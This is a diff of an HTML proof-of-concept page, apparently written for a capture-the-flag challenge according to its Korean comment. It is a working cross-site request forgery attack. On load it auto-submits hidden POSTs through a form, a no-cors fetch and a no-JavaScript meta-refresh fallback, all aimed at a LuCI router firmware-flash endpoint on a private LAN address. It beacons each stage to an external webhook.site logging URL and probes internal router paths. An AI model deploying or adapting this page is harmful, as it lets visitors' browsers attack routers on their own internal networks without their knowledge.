@@ -1,28 +1,56 @@
-<!doctype html><meta charset="utf-8"><title>go</title>
 
 <!-- 대회 문제 풀이용 PoC입니다 접속하지마세요 -->
-<img src="https://webhook.site/57a5efaf-3957-4be7-b7a8-29d7c0bb4026?stage=visit&ts={TS}" style="display:none" />
 
+<!doctype html>
+<meta charset="utf-8">
+<title>loading…</title>
+
+<!-- 외부/로컬 비콘(방문) -->
+<img src="https://webhook.site/57a5efaf-3957-4be7-b7a8-29d7c0bb4026?stage=visit&t="+Date.now() style="display:none" onerror="">
+<img src="/beacon?stage=visit&t="+Date.now() style="display:none" onerror="">
+
+<!-- 내부로 보낼 타깃을 iframe으로(응답시 onload 비콘) -->
 <iframe name="u" style="display:none"
-  onload="new Image().src='https://webhook.site/57a5efaf-3957-4be7-b7a8-29d7c0bb4026?stage=posted&ts='+Date.now()"></iframe>
+        onload="
+          new Image().src='https://webhook.site/57a5efaf-3957-4be7-b7a8-29d7c0bb4026?stage=posted&t='+Date.now();
+          new Image().src='/beacon?stage=posted&t='+Date.now();
+        "></iframe>
 
-<form id="f" target="u"
-  action="http://192.168.0.123/cgi-bin/luci/admin/system/flash"
-  method="POST" enctype="multipart/form-data">
+<!-- 1차: pcap 그대로 모사된 multipart POST -->
+<form id="f"
+      action="http://192.168.0.123/cgi-bin/luci/admin/system/flash"
+      method="POST"
+      enctype="multipart/form-data"
+      target="u">
   <input type="hidden" name="sessionid" value="abc123def4567890">
   <input type="hidden" name="step" value="1">
 </form>
 
 <script>
+  // 캐시회피용 t 파라미터 수집
+  const t = new URL(location.href).searchParams.get('t') || Date.now();
 
-  document.currentScript.previousElementSibling.src =
-    document.currentScript.previousElementSibling.src.replace('{TS}', Date.now());
+  // 2차: JS fetch 폴백 (no-cors, keepalive) — 크로스오리진이라 CORS 헤더는 못 받지만 요청은 발사됨
+  try {
+    const fd = new FormData();
+    fd.append('sessionid','abc123def4567890');
+    fd.append('step','1');
+    fetch('http://192.168.0.123/cgi-bin/luci/admin/system/flash', {
+      method: 'POST', mode: 'no-cors', keepalive: true, body: fd
+    });
+  } catch(e){}
 
+  // 800ms 뒤 폼 자동 제출(가장 호환성 좋음)
   setTimeout(()=>document.getElementById('f').submit(), 800);
 </script>
 
-
+<!-- 3차: JS 꺼져 있어도 동작하는 GET 폴백 -->
 <noscript>
   <meta http-equiv="refresh"
-    content="1;url=http://192.168.0.123/cgi-bin/luci/admin/system/flash?sessionid=abc123def4567890&step=1">
+        content="1;url=http://192.168.0.123/cgi-bin/luci/admin/system/flash?sessionid=abc123def4567890&step=1">
 </noscript>
+
+<!-- 4차: 내부로 단순 GET들을 추가(스캐너/프리페치 유도) -->
+<link rel="prefetch" href="http://192.168.0.123/">
+<img src="http://192.168.0.123/" style="display:none">
+<img src="http://192.168.0.123/HNAP1" style="display:none">
